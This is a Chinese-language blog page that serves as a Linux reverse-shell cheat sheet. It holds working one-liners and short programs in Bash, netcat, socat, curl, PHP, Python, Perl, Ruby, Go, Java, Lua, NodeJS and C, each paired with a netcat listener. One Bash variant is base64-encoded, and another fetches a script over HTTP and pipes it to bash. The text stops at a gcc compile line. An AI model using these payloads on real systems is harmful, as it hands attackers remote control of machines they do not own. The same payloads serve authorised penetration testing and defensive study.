<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>Linux反弹shell备忘录 • Webb</title><meta name="description" content="Linux反弹shell备忘录 - Webb"><link rel="icon" href="/57182600.jpeg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Webb"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Webb" type="application/atom+xml">
</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="Webb"><img class="logo-image" src="/57182600.jpeg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">主页</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">关于</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/works" target="_self">作品</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">档案</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Linux反弹shell备忘录</h1><div class="post-info"><a></a>2022-05-17</div><div class="post-content"><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">/bin/bash -l &gt; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;</span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 2&gt;&amp;0;0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure>

<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nc -lvup &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">/bin/bash -l &gt; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;</span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 2&gt;&amp;0;0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3VkcC88aXA+Lzxwb3J0PiAwPiYx&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure>

<h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">nc &lt;ip&gt; &lt;port&gt; -e bash</span><br><span class="line"></span><br><span class="line">nc &lt;ip&gt; &lt;port&gt; -c bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">mknod</span> /tmp/backpipe p;/bin/bash 0&lt;/tmp/backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt;/tmp/backpipe | <span class="built_in">rm</span> /tmp/backpipe;</span><br></pre></td></tr></table></figure>

<h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;</span> &gt; bash.html</span><br><span class="line">python3 -m http.server</span><br><span class="line">curl &lt;ip&gt;:8000/bash.html | bash</span><br></pre></td></tr></table></figure>

<h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不推荐</span></span><br><span class="line">whois -h &lt;ip&gt; -p &lt;port&gt; `<span class="built_in">pwd</span>` </span><br></pre></td></tr></table></figure>

<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line">nc -lvnp &lt;port2&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; | /bin/bash | telnet &lt;ip&gt; &lt;port2&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">socat tcp-connect:&lt;ip&gt;:&lt;port&gt; <span class="built_in">exec</span>:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>

<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);`/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);popen(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);system(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);passthru(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);shell_exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);$proc=proc_open(&quot;/bin/bash -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;).socket;c=a(&quot;subprocess&quot;).call;s=b();s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;c([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;).socket;p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b();s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;);c=a(&quot;subprocess&quot;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;c([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;);p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&quot;&lt;ip&gt;&quot;</span>;<span class="built_in">export</span> RPORT=&lt;port&gt;;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);os=__import__(&quot;os&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;ip&gt;:&lt;port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;&lt;ip&gt;&quot;;$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;&lt;ip&gt;&quot;,&lt;port&gt;).to_i;exec sprintf(&quot;/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;&lt;ip&gt;&quot;,&quot;&lt;port&gt;&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: #&#123;$_&#125;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;&lt;ip&gt;:&lt;port&gt;&quot;);cmd:=exec.Command(&quot;/bin/bash&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; <span class="built_in">rm</span> /tmp/t.go</span><br></pre></td></tr></table></figure>

<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&#x27;&quot;</span>).waitFor();</span><br><span class="line"></span><br><span class="line">Process p=new ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>).redirectErrorStream(<span class="literal">true</span>).start();Socket s=new Socket(<span class="string">&quot;&lt;ip&gt;&quot;</span>,&lt;port&gt;);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.<span class="built_in">sleep</span>(50);try &#123;p.exitValue();<span class="built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;&lt;ip&gt;&#x27;,&#x27;&lt;port&gt;&#x27;);os.execute(&#x27;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">lua5.1 -e <span class="string">&#x27;local host, port = &quot;&lt;ip&gt;&quot;, &lt;port&gt; local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    var net = require(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        <span class="built_in">cp</span> = require(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(&lt;port&gt;, <span class="string">&quot;&lt;ip&gt;&quot;</span>, <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">return</span> /a/;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;nc -e /bin/bash &lt;ip&gt; &lt;port&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">global.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;nc &lt;ip&gt; &lt;port&gt; -e /bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    struct sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    int sockt = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(&lt;port&gt;);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;&lt;ip&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span><br><span class="line">    sizeof(revsockaddr));</span><br><span class="line">    dup2(sockt, 0);</span><br><span class="line">    dup2(sockt, 1);</span><br><span class="line">    dup2(sockt, 2);</span><br><span class="line"></span><br><span class="line">    char * const argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, NULL&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, argv, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc /tmp/shell.c --output csh 